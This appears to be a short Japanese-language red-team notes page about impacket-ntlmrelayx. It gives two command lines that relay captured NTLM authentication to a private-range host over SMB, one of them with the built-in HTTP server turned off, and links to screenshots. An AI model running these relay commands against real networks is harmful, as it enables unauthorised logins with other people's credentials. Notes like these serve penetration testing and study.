---
title: impacket-ntlmrelayx
parent: Tools
grand_parent: Red Team
---

# 受信したNTLMハッシュを使って中継先にログインする
```zsh
impacket-ntlmrelayx -t 192.168.159.174 -smb2support
```
![](../../../../assets/images/Pasted%20image%2020260501183659.png)

### --no-http-server
```zsh
impacket-ntlmrelayx -t 192.168.159.174 -smb2support --no-http-server
```
![](../../../../assets/images/Pasted%20image%2020260501183654.png)